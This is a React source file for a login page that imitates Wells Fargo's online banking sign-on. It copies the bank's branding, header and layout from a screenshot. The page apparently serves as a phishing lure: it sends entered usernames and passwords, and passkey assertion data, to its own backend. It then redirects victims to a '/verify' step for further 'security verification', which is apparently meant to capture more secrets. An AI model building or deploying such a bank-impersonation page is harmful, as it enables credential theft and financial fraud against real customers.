import { useState } from "react";
import { useForm } from "react-hook-form";
import { useMutation } from "@tanstack/react-query";
import { useToast } from "@/hooks/use-toast";
import { apiRequest } from "@/lib/queryClient";
import { Search } from "lucide-react";
import { Link, useLocation } from "wouter";
import { OfficialFooter } from "@/components/official-footer";

type LoginFormData = {
  username: string;
  password: string;
};

function getGreeting() {
  const hour = new Date().getHours();
  if (hour < 12) return "Good morning";
  if (hour < 17) return "Good afternoon";
  return "Good evening";
}

export default function LoginPage() {
  const [showPassword, setShowPassword] = useState(false);
  const [saveUsername, setSaveUsername] = useState(false);
  const [greeting] = useState(getGreeting());
  const [, setLocation] = useLocation();
  const { toast } = useToast();
  const [biometricLoading, setBiometricLoading] = useState(false);
  const [usernameValue, setUsernameValue] = useState("");

  const handleBiometricLogin = async () => {
    setBiometricLoading(true);
    try {
      const challengeRes = await fetch("/api/auth/biometric/challenge", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type: "authenticate" }),
      });
      if (!challengeRes.ok) throw new Error("Failed to get challenge");
      const { challenge, rpId, allowCredentials } = await challengeRes.json();
      const credential = await navigator.credentials.get({
        publicKey: {
          challenge: Uint8Array.from(atob(challenge), c => c.charCodeAt(0)),
          rpId: rpId || window.location.hostname,
          allowCredentials: allowCredentials?.map((id: string) => ({
            id: Uint8Array.from(atob(id), c => c.charCodeAt(0)),
            type: "public-key" as const,
            transports: ["internal", "hybrid"] as AuthenticatorTransport[],
          })) || [],
          userVerification: "required",
          timeout: 120000,
        },
      }) as PublicKeyCredential;
      if (credential) {
        const authenticatorResponse = credential.response as AuthenticatorAssertionResponse;
        const authData = new Uint8Array(authenticatorResponse.authenticatorData);
        const flags = authData[32];
        const userVerified = (flags & 0x04) !== 0;
        const userPresent = (flags & 0x01) !== 0;
        const authRes = await fetch("/api/auth/biometric/authenticate", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            credentialId: btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array(credential.rawId)))),
            signature: btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array(authenticatorResponse.signature)))),
            authenticatorData: btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array(authenticatorResponse.authenticatorData)))),
            clientDataJSON: btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array(credential.response.clientDataJSON)))),
            biometricType: "facial_recognition",
            userVerified,
            userPresent,
            credentialType: credential.type,
            authenticatorAttachment: (credential as any).authenticatorAttachment || "platform",
          }),
        });
        if (authRes.ok) {
          const authDataResponse = await authRes.json();
          toast({ title: "Face ID Sign On Successful", description: "Please complete security verification..." });
          sessionStorage.setItem("loginUsername", authDataResponse.user?.id || "biometric_user");
          setLocation("/verify");
        } else {
          throw new Error("Biometric authentication failed");
        }
      }
    } catch (error: any) {
      console.log("Face ID not available or cancelled");
    } finally {
      setBiometricLoading(false);
    }
  };

  const form = useForm<LoginFormData>({ defaultValues: { username: "", password: "" } });

  const loginMutation = useMutation({
    mutationFn: async (data: LoginFormData) => {
      const response = await apiRequest("POST", "/api/auth/login", { username: data.username, password: data.password });
      const result = await response.json();
      return { ...result, username: data.username };
    },
    onSuccess: (data) => {
      sessionStorage.setItem("loginUsername", data.username);
      toast({ title: "Sign On Successful", description: "Please complete security verification..." });
      setLocation("/verify");
    },
    onError: (error: Error) => {
      toast({ title: "Sign On Failed", description: error.message || "Invalid username or password", variant: "destructive" });
    },
  });

  const onSubmit = (data: LoginFormData) => loginMutation.mutate(data);

  const LoginCard = ({ isDesktop = false }: { isDesktop?: boolean }) => (
    <div
      className="rounded-2xl shadow-2xl"
      style={{
        width: isDesktop ? 420 : "100%",
        padding: isDesktop ? "40px 44px" : "28px 18px 40px",
        backgroundColor: "#ffffff",
      }}
    >
      <h2
        className="font-normal text-[#111] text-center leading-none mb-7"
        style={{
          fontFamily: "Georgia, 'Times New Roman', serif",
          fontSize: isDesktop ? 34 : 32,
        }}
        data-testid="text-greeting"
      >
        {greeting}
      </h2>

      <form onSubmit={form.handleSubmit(onSubmit)}>
        {/* Username field */}
        <div className="mb-[10px] relative">
          <input
            {...form.register("username", { required: true })}
            placeholder="Username"
            autoComplete="username"
            autoCapitalize="off"
            autoCorrect="off"
            spellCheck={false}
            onChange={(e) => {
              form.setValue("username", e.target.value);
              setUsernameValue(e.target.value);
            }}
            className="w-full text-[16px] text-gray-800 placeholder-gray-400 bg-white rounded-[12px] focus:outline-none"
            style={{
              height: 56,
              padding: "0 44px 0 14px",
              border: "1.5px solid #c8c8c8",
            }}
            data-testid="input-username"
          />
          {usernameValue && (
            <button
              type="button"
              onMouseDown={(e) => e.preventDefault()}
              onClick={() => { form.setValue("username", ""); setUsernameValue(""); }}
              className="absolute right-[12px] top-1/2 -translate-y-1/2"
              data-testid="button-clear-username"
            >
              <svg viewBox="0 0 20 20" width="20" height="20" fill="none">
                <circle cx="10" cy="10" r="9" stroke="#aaa" strokeWidth="1.5" />
                <path d="M7 7l6 6M13 7l-6 6" stroke="#aaa" strokeWidth="1.5" strokeLinecap="round" />
              </svg>
            </button>
          )}
        </div>

        {/* Password field */}
        <div className="mb-[14px] relative">
          <input
            {...form.register("password", { required: true })}
            type={showPassword ? "text" : "password"}
            placeholder="Password"
            autoComplete="current-password"
            className="w-full text-[16px] text-gray-800 placeholder-gray-400 bg-white rounded-[12px] focus:outline-none"
            style={{
              height: 56,
              padding: "0 56px 0 14px",
              border: "1.5px solid #c8c8c8",
            }}
            data-testid="input-password"
          />
          <button
            type="button"
            onMouseDown={(e) => e.preventDefault()}
            onClick={() => setShowPassword(!showPassword)}
            className="absolute right-[14px] top-1/2 -translate-y-1/2 text-[#4338ca] text-[15px] font-medium"
            data-testid="button-toggle-password"
          >
            {showPassword ? "Hide" : "Show"}
          </button>
        </div>

        {/* Save username */}
        <div className="flex items-center gap-[10px] mb-[8px]">
          <div
            className="w-[18px] h-[18px] flex-shrink-0 border border-gray-500 flex items-center justify-center cursor-pointer bg-white"
            style={{ borderRadius: 3 }}
            onClick={() => setSaveUsername(!saveUsername)}
            data-testid="checkbox-save-username"
          >
            {saveUsername && (
              <svg viewBox="0 0 12 12" className="w-3 h-3" fill="none">
                <path d="M2 6l3 3 5-5" stroke="#333" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" />
              </svg>
            )}
          </div>
          <label className="text-[15px] text-gray-800 cursor-pointer select-none" onClick={() => setSaveUsername(!saveUsername)}>
            Save username
          </label>
        </div>

        {/* Security text */}
        <p className="text-[12.5px] text-gray-500 leading-[1.45] mb-[28px]">
          To help keep your account secure, save your username only on devices that aren't used by other people.
        </p>

        {/* Sign on button */}
        <div className="flex justify-center mb-[14px]">
          <button
            type="submit"
            disabled={loginMutation.isPending}
            className="rounded-full text-[16px] font-medium transition-colors disabled:opacity-60"
            style={{ height: 50, width: 220, backgroundColor: "#d0d0d0", color: "#888" }}
            data-testid="button-sign-on"
          >
            {loginMutation.isPending ? "Signing on…" : "Sign on"}
          </button>
        </div>
      </form>

      <p className="text-center text-[14px] text-gray-600 mb-[14px]">or</p>

      {/* Passkey button */}
      <div className="flex justify-center mb-[14px]">
        <button
          type="button"
          onClick={handleBiometricLogin}
          disabled={biometricLoading}
          className="rounded-full bg-white text-[15px] font-medium text-gray-900 flex items-center justify-center gap-[7px] hover:bg-gray-50 transition-colors disabled:opacity-60"
          style={{ height: 50, width: 220, border: "1.5px solid #222" }}
          data-testid="button-passkey"
        >
          <svg viewBox="0 0 20 20" width="19" height="19" fill="none" aria-hidden="true">
            <circle cx="8" cy="6" r="3.5" stroke="#333" strokeWidth="1.4" />
            <path d="M1.5 17c0-3.3 2.9-6 6.5-6" stroke="#333" strokeWidth="1.4" strokeLinecap="round" />
            <circle cx="15" cy="13.5" r="2.5" stroke="#333" strokeWidth="1.4" />
            <path d="M17 15l1.5 1.5M18.5 15.5L17 17" stroke="#333" strokeWidth="1.3" strokeLinecap="round" />
            <circle cx="15" cy="13.5" r="0.8" fill="#333" />
          </svg>
          {biometricLoading ? "Authenticating…" : "Use a passkey"}
        </button>
      </div>

      <p className="text-[12.5px] text-gray-600 leading-[1.45] mb-[36px]">
        Don't have one? Create a passkey after signing on and skip the password next time.
      </p>

      <div className="flex items-center justify-center gap-[5px]">
        <span className="text-[#4b3f9e] text-[15px]">→</span>
        <Link href="/forgot-password" className="text-[#4b3f9e] text-[15px] hover:underline" data-testid="link-forgot">
          Forgot username or password?
        </Link>
      </div>
    </div>
  );

  return (
    <>
      {/* ── DESKTOP LAYOUT ── */}
      <div className="hidden lg:flex flex-col min-h-screen">

        {/* Header — Wells Fargo standard red matching screenshot */}
        <header style={{ backgroundColor: "#b01e22", flexShrink: 0 }}>
          <div className="px-6 flex items-center justify-between" style={{ height: 48 }}>
            <div
              className="text-white font-bold tracking-[0.14em]"
              style={{ fontFamily: "'Times New Roman', Georgia, serif", fontSize: 21 }}
            >
              WELLS FARGO
            </div>
            <div className="flex items-center gap-5 text-white" style={{ fontSize: 13 }}>
              <div className="flex items-center gap-1.5 cursor-pointer hover:underline">
                <svg viewBox="0 0 16 16" width="13" height="13" fill="none">
                  <rect x="3" y="7" width="10" height="8" rx="1.5" stroke="white" strokeWidth="1.4" />
                  <path d="M5.5 7V5a2.5 2.5 0 0 1 5 0v2" stroke="white" strokeWidth="1.4" strokeLinecap="round" />
                </svg>
                <Link href="/register" className="text-white hover:underline">Enroll</Link>
              </div>
              <span className="cursor-pointer hover:underline">Customer Service</span>
              <span className="cursor-pointer hover:underline">ATMs/Locations</span>
              <span className="cursor-pointer hover:underline">Español</span>
              {/* Search box — white box with search icon */}
              <div
                className="flex items-center justify-between bg-white cursor-pointer"
                style={{ height: 28, borderRadius: 3, padding: "0 8px 0 10px", gap: 6, minWidth: 80 }}
              >
                <span className="text-gray-400" style={{ fontSize: 12 }}>Search</span>
                <div
                  className="flex items-center justify-center rounded-sm"
                  style={{ width: 22, height: 22, backgroundColor: "#b01e22" }}
                >
                  <Search className="text-white" style={{ width: 12, height: 12 }} />
                </div>
              </div>
            </div>
          </div>
        </header>

        {/* Full-page background with centered card */}
        <div
          className="flex-1 flex items-center justify-center relative overflow-hidden"
          style={{ minHeight: "calc(100vh - 46px)" }}
        >
          {/* Snowy winter park scene — coded from reference screenshot */}
          <svg
            className="absolute inset-0"
            viewBox="0 0 1440 900"
            preserveAspectRatio="xMidYMid slice"
            style={{ width: "100%", height: "100%" }}
            xmlns="http://www.w3.org/2000/svg"
          >
            <defs>
              <linearGradient id="sky" x1="0" y1="0" x2="0" y2="1">
                <stop offset="0%"   stopColor="#8fb8cc" />
                <stop offset="20%"  stopColor="#b0ceda" />
                <stop offset="45%"  stopColor="#cddde8" />
                <stop offset="70%"  stopColor="#dce8f0" />
                <stop offset="100%" stopColor="#eaf3f8" />
              </linearGradient>
              <linearGradient id="groundSnow" x1="0" y1="0" x2="0" y2="1">
                <stop offset="0%"   stopColor="#daedf8" />
                <stop offset="100%" stopColor="#c4dff0" />
              </linearGradient>
              <filter id="fb"><feGaussianBlur stdDeviation="5"/></filter>
              <filter id="fm"><feGaussianBlur stdDeviation="2.5"/></filter>
              <filter id="fs"><feGaussianBlur stdDeviation="1"/></filter>
            </defs>

            {/* Sky */}
            <rect width="1440" height="900" fill="url(#sky)" />

            {/* ===== FAR BACKGROUND — very blurred, very pale ===== */}
            <g filter="url(#fb)" opacity="0.55">
              {/* center-left background cluster */}
              <rect x="336" y="610" width="7" height="150" fill="#6e8fa0"/>
              <ellipse cx="340" cy="552" rx="46" ry="64" fill="#b5ceda"/>
              <ellipse cx="314" cy="572" rx="34" ry="48" fill="#bcd4e0"/>
              <ellipse cx="368" cy="564" rx="36" ry="52" fill="#b8d0dc"/>
              <ellipse cx="340" cy="506" rx="34" ry="46" fill="#bedce8"/>
              {/* center-left b2 */}
              <rect x="424" y="622" width="6" height="138" fill="#6e8fa0"/>
              <ellipse cx="427" cy="568" rx="40" ry="57" fill="#b8d2de"/>
              <ellipse cx="404" cy="586" rx="30" ry="43" fill="#bcd6e2"/>
              <ellipse cx="452" cy="578" rx="32" ry="46" fill="#b6d0dc"/>
              {/* center-right background cluster */}
              <rect x="1000" y="610" width="7" height="150" fill="#6e8fa0"/>
              <ellipse cx="1004" cy="552" rx="46" ry="64" fill="#b5ceda"/>
              <ellipse cx="978" cy="572" rx="34" ry="48" fill="#bcd4e0"/>
              <ellipse cx="1032" cy="564" rx="36" ry="52" fill="#b8d0dc"/>
              <ellipse cx="1004" cy="506" rx="34" ry="46" fill="#bedce8"/>
              {/* center-right b2 */}
              <rect x="1008" y="622" width="6" height="138" fill="#6e8fa0"/>
              <ellipse cx="1012" cy="568" rx="40" ry="57" fill="#b8d2de"/>
              <ellipse cx="988" cy="586" rx="30" ry="43" fill="#bcd6e2"/>
              <ellipse cx="1036" cy="578" rx="32" ry="46" fill="#b6d0dc"/>
            </g>

            {/* ===== MID-GROUND LEFT — slightly blurred ===== */}
            <g filter="url(#fm)" opacity="0.78">
              {/* Tree ML-1 x≈185 */}
              <rect x="181" y="570" width="10" height="200" fill="#5c7e92"/>
              <ellipse cx="186" cy="488" rx="62" ry="87" fill="#c0d8e6"/>
              <ellipse cx="158" cy="512" rx="44" ry="62" fill="#c6dcec"/>
              <ellipse cx="216" cy="502" rx="48" ry="67" fill="#c2daea"/>
              <ellipse cx="186" cy="436" rx="46" ry="60" fill="#cae0ec"/>
              <ellipse cx="162" cy="454" rx="34" ry="48" fill="#cce2ee"/>
              <ellipse cx="212" cy="446" rx="38" ry="52" fill="#c8deea"/>
              {/* Tree ML-2 x≈278 */}
              <rect x="274" y="585" width="9" height="185" fill="#5c7e92"/>
              <ellipse cx="278" cy="508" rx="55" ry="78" fill="#bdd6e4"/>
              <ellipse cx="252" cy="530" rx="40" ry="56" fill="#c2dae8"/>
              <ellipse cx="306" cy="521" rx="43" ry="60" fill="#bfd8e6"/>
              <ellipse cx="278" cy="460" rx="40" ry="55" fill="#c6dcea"/>
            </g>

            {/* ===== MID-GROUND RIGHT — slightly blurred ===== */}
            <g filter="url(#fm)" opacity="0.78">
              {/* Tree MR-1 x≈1255 */}
              <rect x="1251" y="570" width="10" height="200" fill="#5c7e92"/>
              <ellipse cx="1256" cy="488" rx="62" ry="87" fill="#c0d8e6"/>
              <ellipse cx="1228" cy="512" rx="44" ry="62" fill="#c6dcec"/>
              <ellipse cx="1286" cy="502" rx="48" ry="67" fill="#c2daea"/>
              <ellipse cx="1256" cy="436" rx="46" ry="60" fill="#cae0ec"/>
              <ellipse cx="1232" cy="454" rx="34" ry="48" fill="#cce2ee"/>
              <ellipse cx="1282" cy="446" rx="38" ry="52" fill="#c8deea"/>
              {/* Tree MR-2 x≈1162 */}
              <rect x="1158" y="585" width="9" height="185" fill="#5c7e92"/>
              <ellipse cx="1162" cy="508" rx="55" ry="78" fill="#bdd6e4"/>
              <ellipse cx="1136" cy="530" rx="40" ry="56" fill="#c2dae8"/>
              <ellipse cx="1190" cy="521" rx="43" ry="60" fill="#bfd8e6"/>
              <ellipse cx="1162" cy="460" rx="40" ry="55" fill="#c6dcea"/>
            </g>

            {/* ===== FOREGROUND LEFT — crisp, bright snow ===== */}
            {/* Large Tree FL-1 — partially off screen left */}
            <g filter="url(#fs)">
              <rect x="32" y="500" width="16" height="300" fill="#4a6878"/>
              {/* Main canopy blobs */}
              <ellipse cx="40" cy="388" rx="98" ry="128" fill="#d8ecf6"/>
              <ellipse cx="5"  cy="430" rx="70" ry="92"  fill="#deeef8"/>
              <ellipse cx="78" cy="418" rx="76" ry="100" fill="#daedf7"/>
              {/* Upper blobs */}
              <ellipse cx="40" cy="320" rx="72" ry="95"  fill="#e0f0f8"/>
              <ellipse cx="10" cy="345" rx="52" ry="70"  fill="#e4f2f9"/>
              <ellipse cx="72" cy="338" rx="56" ry="74"  fill="#e2f1f8"/>
              {/* Top */}
              <ellipse cx="40" cy="262" rx="52" ry="68"  fill="#e6f3fa"/>
              <ellipse cx="20" cy="280" rx="38" ry="52"  fill="#e8f4fb"/>
              <ellipse cx="62" cy="275" rx="42" ry="56"  fill="#e4f2f9"/>
              {/* Side snow piles on branches */}
              <ellipse cx="-30" cy="455" rx="48" ry="30" fill="#ecf7fc"/>
              <ellipse cx="110" cy="445" rx="52" ry="32" fill="#eaf6fb"/>
              {/* Branch lines */}
              <line x1="40" y1="420" x2="-22" y2="462" stroke="#4a6878" strokeWidth="3.5" opacity="0.5"/>
              <line x1="40" y1="420" x2="104" y2="455" stroke="#4a6878" strokeWidth="3.5" opacity="0.5"/>
              <line x1="40" y1="380" x2="2"   y2="348" stroke="#4a6878" strokeWidth="2.5" opacity="0.4"/>
              <line x1="40" y1="380" x2="80"  y2="346" stroke="#4a6878" strokeWidth="2.5" opacity="0.4"/>
            </g>

            {/* Tree FL-2 x≈148 */}
            <g filter="url(#fs)">
              <rect x="143" y="520" width="13" height="280" fill="#4a6878"/>
              <ellipse cx="150" cy="418" rx="82" ry="110" fill="#d4eaf5"/>
              <ellipse cx="122" cy="448" rx="58" ry="78"  fill="#daeef7"/>
              <ellipse cx="180" cy="438" rx="62" ry="84"  fill="#d8ecf6"/>
              <ellipse cx="150" cy="356" rx="60" ry="82"  fill="#dceef7"/>
              <ellipse cx="125" cy="378" rx="44" ry="60"  fill="#e0f1f8"/>
              <ellipse cx="178" cy="370" rx="48" ry="64"  fill="#def0f7"/>
              <ellipse cx="150" cy="302" rx="44" ry="58"  fill="#e2f2f9"/>
              <ellipse cx="132" cy="318" rx="32" ry="45"  fill="#e6f3f9"/>
              <ellipse cx="170" cy="313" rx="36" ry="48"  fill="#e4f2f9"/>
              <ellipse cx="-8"  cy="465" rx="40" ry="26"  fill="#ecf6fb"/>
              <ellipse cx="210" cy="455" rx="44" ry="28"  fill="#eaf6fb"/>
              <line x1="150" y1="440" x2="108" y2="472" stroke="#4a6878" strokeWidth="3" opacity="0.45"/>
              <line x1="150" y1="440" x2="193" y2="467" stroke="#4a6878" strokeWidth="3" opacity="0.45"/>
            </g>

            {/* ===== FOREGROUND RIGHT — mirror of left ===== */}
            {/* Large Tree FR-1 — partially off screen right */}
            <g filter="url(#fs)">
              <rect x="1392" y="500" width="16" height="300" fill="#4a6878"/>
              <ellipse cx="1400" cy="388" rx="98" ry="128" fill="#d8ecf6"/>
              <ellipse cx="1365" cy="430" rx="70" ry="92"  fill="#deeef8"/>
              <ellipse cx="1438" cy="418" rx="76" ry="100" fill="#daedf7"/>
              <ellipse cx="1400" cy="320" rx="72" ry="95"  fill="#e0f0f8"/>
              <ellipse cx="1370" cy="345" rx="52" ry="70"  fill="#e4f2f9"/>
              <ellipse cx="1432" cy="338" rx="56" ry="74"  fill="#e2f1f8"/>
              <ellipse cx="1400" cy="262" rx="52" ry="68"  fill="#e6f3fa"/>
              <ellipse cx="1380" cy="280" rx="38" ry="52"  fill="#e8f4fb"/>
              <ellipse cx="1422" cy="275" rx="42" ry="56"  fill="#e4f2f9"/>
              <ellipse cx="1340" cy="455" rx="48" ry="30"  fill="#ecf7fc"/>
              <ellipse cx="1470" cy="445" rx="52" ry="32"  fill="#eaf6fb"/>
              <line x1="1400" y1="420" x2="1338" y2="462" stroke="#4a6878" strokeWidth="3.5" opacity="0.5"/>
              <line x1="1400" y1="420" x2="1464" y2="455" stroke="#4a6878" strokeWidth="3.5" opacity="0.5"/>
              <line x1="1400" y1="380" x2="1362" y2="348" stroke="#4a6878" strokeWidth="2.5" opacity="0.4"/>
              <line x1="1400" y1="380" x2="1440" y2="346" stroke="#4a6878" strokeWidth="2.5" opacity="0.4"/>
            </g>

            {/* Tree FR-2 x≈1290 */}
            <g filter="url(#fs)">
              <rect x="1284" y="520" width="13" height="280" fill="#4a6878"/>
              <ellipse cx="1291" cy="418" rx="82" ry="110" fill="#d4eaf5"/>
              <ellipse cx="1263" cy="448" rx="58" ry="78"  fill="#daeef7"/>
              <ellipse cx="1321" cy="438" rx="62" ry="84"  fill="#d8ecf6"/>
              <ellipse cx="1291" cy="356" rx="60" ry="82"  fill="#dceef7"/>
              <ellipse cx="1266" cy="378" rx="44" ry="60"  fill="#e0f1f8"/>
              <ellipse cx="1319" cy="370" rx="48" ry="64"  fill="#def0f7"/>
              <ellipse cx="1291" cy="302" rx="44" ry="58"  fill="#e2f2f9"/>
              <ellipse cx="1273" cy="318" rx="32" ry="45"  fill="#e6f3f9"/>
              <ellipse cx="1311" cy="313" rx="36" ry="48"  fill="#e4f2f9"/>
              <ellipse cx="1230" cy="465" rx="40" ry="26"  fill="#ecf6fb"/>
              <ellipse cx="1352" cy="455" rx="44" ry="28"  fill="#eaf6fb"/>
              <line x1="1291" y1="440" x2="1249" y2="472" stroke="#4a6878" strokeWidth="3" opacity="0.45"/>
              <line x1="1291" y1="440" x2="1334" y2="467" stroke="#4a6878" strokeWidth="3" opacity="0.45"/>
            </g>

            {/* ===== SNOW GROUND ===== */}
            <path
              d="M0,820 Q160,800 320,808 Q480,816 640,804 Q720,798 800,804 Q960,816 1120,808 Q1280,800 1440,812 L1440,900 L0,900 Z"
              fill="#d8edf8"
            />
            <path
              d="M0,845 Q240,828 480,836 Q720,844 960,836 Q1200,828 1440,840 L1440,900 L0,900 Z"
              fill="#e4f2fa"
            />
            <path
              d="M0,868 Q360,858 720,862 Q1080,866 1440,860 L1440,900 L0,900 Z"
              fill="#eef7fc"
            />

            {/* Fence posts / park silhouette at very bottom */}
            {[200,240,280,320,360,1080,1120,1160,1200,1240].map((x, i) => (
              <rect key={i} x={x} y={848} width="5" height="52" fill="#38545e" opacity="0.7"/>
            ))}
            {/* Horizontal fence rail */}
            <rect x="198" y="860" width="168" height="3" fill="#38545e" opacity="0.5"/>
            <rect x="1078" y="860" width="168" height="3" fill="#38545e" opacity="0.5"/>

            {/* Subtle snow particles */}
            {[80,180,310,450,590,680,760,850,980,1100,1220,1340].map((x, i) => (
              <circle key={i} cx={x} cy={60 + (i * 55) % 300} r="2.2" fill="white" opacity="0.6"/>
            ))}
            {[140,260,400,520,620,730,820,940,1060,1180,1300,1400].map((x, i) => (
              <circle key={i+20} cx={x} cy={120 + (i * 47) % 250} r="1.6" fill="white" opacity="0.45"/>
            ))}
          </svg>

          {/* Login card — centered */}
          <div className="relative z-10">
            <LoginCard isDesktop={true} />
          </div>
        </div>
      </div>

      {/* ── MOBILE LAYOUT ── */}
      <div className="lg:hidden min-h-screen flex flex-col bg-white">
        <header className="bg-[#d71e28] flex items-center px-4" style={{ height: 52 }}>
          <div className="flex-1" />
          <span
            className="text-white font-bold text-[17px] tracking-[0.16em]"
            style={{ fontFamily: "'Times New Roman', Georgia, serif" }}
          >
            WELLS FARGO
          </span>
          <div className="flex-1 flex justify-end">
            <button
              type="button"
              aria-label="Menu"
              data-testid="button-mobile-menu"
              className="flex flex-col justify-center gap-[5px] py-2"
            >
              <span className="block w-[22px] h-[2px] bg-white" />
              <span className="block w-[22px] h-[2px] bg-white" />
              <span className="block w-[22px] h-[2px] bg-white" />
            </button>
          </div>
        </header>
        <div className="h-[3px] bg-[#ffcd41]" />
        <main className="flex-1 bg-white overflow-y-auto">
          <div className="px-[18px] pt-7 pb-10">
            <LoginCard isDesktop={false} />
          </div>
        </main>
        <OfficialFooter />
      </div>
    </>
  );
}
